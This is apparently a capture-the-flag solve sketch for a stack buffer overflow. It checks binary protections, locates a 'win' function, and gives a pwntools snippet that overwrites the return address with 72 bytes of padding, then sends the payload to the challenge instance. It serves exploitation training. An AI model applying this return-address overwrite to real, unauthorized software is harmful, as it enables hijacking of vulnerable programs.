# Solve sketch

1. `checksec` → No canary, No PIE, NX on.
2. Find `win` with `objdump -d challenge | grep win`.
3. Overflow 64-byte buffer + saved RBP + return address.
4. On x86-64, pad 8 bytes before the return address if needed.

Example (addresses vary per build):

```python
from pwn import *

elf = ELF("./challenge")
win = elf.symbols["win"]
payload = b"A" * 72 + p64(win)
```

Remote: connect to the issued instance host/port and send the payload.